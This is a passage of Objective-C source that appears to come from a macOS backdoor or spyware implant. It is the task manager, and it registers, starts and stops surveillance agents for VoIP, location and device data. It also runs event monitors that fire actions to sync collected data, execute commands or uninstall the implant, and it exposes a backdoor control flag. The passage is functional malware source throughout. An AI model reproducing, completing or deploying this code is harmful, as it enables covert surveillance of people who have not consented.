                    infoLog(@"Stop command sent to Agent Voip", agentID);
#endif
                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                  }
              
                [agentCommand release];
                
                break;
              }
            case AGENT_POSITION:
              {
#ifdef DEBUG_TASK_MANAGER        
                infoLog(@"Stopping Agent Position");
#endif
                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
                
                if ([agentPosition stop] == FALSE)
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Error while stopping agent Position");
#endif
                  return NO;
                }
                else
                {
                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
                }
                break;
              }
            case AGENT_DEVICE:
              {
#ifdef DEBUG_TASK_MANAGER        
                infoLog(@"Stopping Agent Device");
#endif
                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
                
                if ([agentDevice stop] == FALSE)
                {
#ifdef DEBUG_TASK_MANAGER
                  infoLog(@"Error while stopping agent agentDevice");
#endif
                  return NO;
                }
                else
                {
                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
                }
                break;
              }
            }
        }
      
      [status release];
      [innerPool release];
      
      usleep(50000);
    }
  
  [outerPool release];
  
  return YES;
}

#pragma mark -
#pragma mark Monitors
#pragma mark -

- (void)eventsMonitor
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"eventsMonitor called, starting all the thread monitors");
#endif
  NSEnumerator *enumerator = [mEventsList objectEnumerator];
  id anObject;
  
  while ((anObject = [enumerator nextObject]) != nil)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      [[anObject retain] autorelease];
      
      u_int eventType = [[anObject threadSafeObjectForKey: @"type"
                                                usingLock: gTaskManagerLock] intValue];
      
      //u_int eventType = [[anObject objectForKey: @"type"] intValue];
                                              
      switch (eventType)
        {
        case EVENT_TIMER:
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"EVENT TIMER FOUND! Starting monitor Thread");
#endif
            RCSMEvents *events = [RCSMEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventTimer:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_PROCESS:
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"EVENT Process FOUND! Starting monitor Thread");
#endif
            RCSMEvents *events = [RCSMEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventProcess:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_CONNECTION:
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"EVENT Connection FOUND! Starting monitor Thread");
#endif
            RCSMEvents *events = [RCSMEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventConnection:)
                                     toTarget: events
                                   withObject: anObject];
            break; 
          }
        case EVENT_SCREENSAVER:
          {
#ifdef DEBUG_TASK_MANAGER
            infoLog(@"EVENT Screensaver FOUND! Starting monitor Thread");
#endif
            RCSMEvents *events = [RCSMEvents sharedEvents];
            [NSThread detachNewThreadSelector: @selector(eventScreensaver:)
                                     toTarget: events
                                   withObject: anObject];
            break;
          }
        case EVENT_SYSLOG:
          break;
        case EVENT_QUOTA:
          break;
        default:
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Event not implemented");
#endif
          break;
        }
      
      [innerPool release];
    }
  
  [outerPool release];
}

- (BOOL)stopEvents
{
  NSMutableDictionary *anObject;
  
  int counter   = 0;
  int errorFlag = 0;
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Stop all events called");
#endif
  
  int i = 0;
  
  for (; i < [mEventsList count]; i++)
    {
      anObject = [mEventsList objectAtIndex: i];
      
      [anObject setValue: EVENT_STOP
                  forKey: @"status"];
      
      while ([anObject objectForKey: @"status"] != EVENT_STOPPED
             && counter <= MAX_STOP_WAIT_TIME)
        {
          sleep(1);
          counter++;
        }
      
      if (counter == MAX_STOP_WAIT_TIME)
        errorFlag = 1;
      
      counter = 0;
    }
  
  if (errorFlag == 0)
    return TRUE;
  
  return FALSE;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (BOOL)triggerAction: (int)anActionID
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Triggering action: %d", anActionID);
#endif
  BOOL _isSyncing = NO;
  int waitCounter = 0;
  
  NSMutableDictionary *configuration = [self getConfigForAction: anActionID];
    
  if (configuration == nil)
    {
#ifdef DEBUG_TASK_MANAGER
      infoLog(@"Action not found");
#endif
      
      [outerPool release];
      return FALSE;
    }
  
  u_int actionType = [[configuration objectForKey: @"type"] intValue];
  
  switch (actionType)
    {
    case ACTION_SYNC:
      {
        [gSyncLock lock];
        _isSyncing = mIsSyncing;
        [gSyncLock unlock];
        
        if (_isSyncing == YES)
          {
#ifdef DEBUG_TASK_MANAGER
            warnLog(@"Sync op already in place - waiting");
#endif
            
            while (_isSyncing == YES && waitCounter < MAX_ACTION_WAIT_TIME)
              {
                //usleep(250000);
                
                [gSyncLock lock];
                _isSyncing = mIsSyncing;
                [gSyncLock unlock];
                
                sleep(1);
                waitCounter++;
              }
              
            // We've waited way too much here
            if (waitCounter == MAX_ACTION_WAIT_TIME)
              {
#ifdef DEBUG_TASK_MANAGER
                errorLog(@"Sync timed out while waiting for another in place");
#endif
                return FALSE;
              }
          }
        
        [gSyncLock lock];
        mIsSyncing = YES;
        [gSyncLock unlock];
        
        NSNumber *status = [NSNumber numberWithInt: ACTION_PERFORMING];
        //[configuration setObject: status forKey: @"status"];
        [configuration threadSafeSetObject: status
                                    forKey: @"status"
                                 usingLock: gSyncLock];
        
        [mActions actionSync: configuration];
        
        [gSyncLock lock];
        mIsSyncing = NO;
        [gSyncLock unlock];
        
        break;
      }
    case ACTION_AGENT_START:
      {
        //
        // TODO: call directly startAgent (?)
        //
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            [configuration setObject: status forKey: @"status"];
            //[configuration threadSafeSetObject: status
            //                            forKey: @"status"
            //                         usingLock: gTaskManagerLock];

            [mActions actionAgent: configuration start: TRUE];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Can't start agent with status: %d",
                     [[configuration objectForKey: @"status"] intValue]);
#endif
          }
        break;
      }
    case ACTION_AGENT_STOP:
      {
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            //[configuration setObject: status forKey: @"status"];
            [configuration threadSafeSetObject: status
                                        forKey: @"status"
                                     usingLock: gTaskManagerLock];
            
            [mActions actionAgent: configuration start: FALSE];
          }
        else
          {
#ifdef DEBUG_TASK_MANAGER
            errorLog(@"Can't stop agent with status: %d",
                     [[configuration objectForKey: @"status"] intValue]);
#endif
          }
        break;
      }
    case ACTION_EXECUTE:
      {
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            //[configuration setObject: status forKey: @"status"];
            [configuration threadSafeSetObject: status
                                        forKey: @"status"
                                     usingLock: gTaskManagerLock];
            
            [mActions actionLaunchCommand: configuration];
          }
        
        break;
      }
    case ACTION_UNINSTALL:
      {
        if ([[configuration objectForKey: @"status"] intValue] == 0)
          {
            NSNumber *status = [NSNumber numberWithInt: 1];
            //[configuration setObject: status forKey: @"status"];
            [configuration threadSafeSetObject: status
                                        forKey: @"status"
                                     usingLock: gTaskManagerLock];
            
            [mActions actionUninstall: configuration];
          }
        
        break;
      }
    default:
      {
#ifdef DEBUG_TASK_MANAGER
        errorLog(@"Unknown action type: %d", actionType);
#endif
      } break;
    }
  
  [outerPool release];
  return TRUE;
}

#pragma mark -
#pragma mark Registering functions for events/actions/agents
#pragma mark -

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Registering event type %d", aType);
#endif

  NSMutableDictionary *eventConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: aType];
  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
  
  NSArray *keys = [NSArray arrayWithObjects: @"type",
                                             @"actionID",
                                             @"data",
                                             @"status",
                                             @"monitor",
                                             nil];
  
  NSArray *objects;
  
  if (eventData == nil)
    {
      objects = [NSArray arrayWithObjects: type,
                                           action,
                                           @"",
                                           EVENT_START,
                                           @"",
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: type,
                                           action,
                                           eventData,
                                           EVENT_START,
                                           @"",
                                           nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [eventConfiguration addEntriesFromDictionary: dictionary];
  [mEventsList addObject: eventConfiguration];
  
  return YES;
}

- (BOOL)unregisterEvent: (u_int)eventID
{
  return YES;
}

- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Registering action ID (%d) with type (%d)", actionID, actionType);
#endif
  NSMutableDictionary *actionConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
 
  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: actionType];
  NSNumber *status  = [NSNumber numberWithInt: 0];
    
  NSArray *keys     = [NSArray arrayWithObjects: @"actionID",
                                                 @"type",
                                                 @"data",
                                                 @"status",
                                                 nil];
  
  NSArray *objects;
  
  if (actionData == nil)
    {
      objects = [NSArray arrayWithObjects: action,
                                           type,
                                           @"",
                                           status,
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: action,
                                           type,
                                           actionData,
                                           status,
                                           nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [actionConfiguration addEntriesFromDictionary: dictionary];
  [mActionsList addObject: actionConfiguration];
  
  return YES;
}

- (BOOL)unregisterAction: (u_int)actionID
{
  return YES;
}

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
        (status == 1 ) ? @"activated" : @"deactivated", agentData);
#endif
  NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
  NSNumber *tempID      = [NSNumber numberWithUnsignedInt: agentID];
  NSString *agentState  = (status == 1) ? AGENT_ENABLED : AGENT_DISABLED;
    
  NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                                             @"status",
                                             @"data",
                                             nil];
  
  NSArray *objects;
  
  if (agentData == nil)
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           @"",
                                           nil];
    }
  else
    {
      objects = [NSArray arrayWithObjects: tempID,
                                           agentState,
                                           agentData,
                                           nil];
    }
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [agentConfiguration addEntriesFromDictionary: dictionary];
  [mAgentsList addObject: agentConfiguration];
  
  return YES;  
}

- (BOOL)unregisterAgent: (u_int)agentID
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSArray *)eventsList
{
  return mEventsList;
}

- (NSArray *)actionsList
{
  return mActionsList;
}

- (NSArray *)agentsList
{
  return mAgentsList;
}

- (NSMutableDictionary *)getConfigForAction: (u_int)anActionID
{
  id anObject;
  int i = 0;
  
  for (; i < [mActionsList count]; i++)
    {
      anObject = [mActionsList objectAtIndex: i];
      
      if ([[anObject threadSafeObjectForKey: @"actionID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anActionID)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Action %d found", anActionID);
#endif
          return anObject;
        }
    }
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Action not found! %d", anActionID);
#endif
  
  return nil;
}

- (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
{
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"getConfigForAgent called %x", anAgentID);
#endif
  
  NSMutableDictionary *anObject;
  int i = 0;
  
  for (; i < [mAgentsList count]; i++)
    {
      anObject = [mAgentsList objectAtIndex: i];
      
      if ([[anObject threadSafeObjectForKey: @"agentID"
                                  usingLock: gTaskManagerLock]
           unsignedIntValue] == anAgentID)
        {
#ifdef DEBUG_TASK_MANAGER
          infoLog(@"Agent %d found", anAgentID);
#endif
          return anObject;
        }
    }
  
#ifdef DEBUG_TASK_MANAGER
  infoLog(@"Agent %d not found", anAgentID);
#endif

  return nil;
}

- (void)removeAllElements
{
  [mEventsList  removeAllObjects];
  [mActionsList removeAllObjects];
  [mAgentsList  removeAllObjects];
}

- (NSString *)getControlFlag
{
  return mBackdoorControlFlag;
}

@end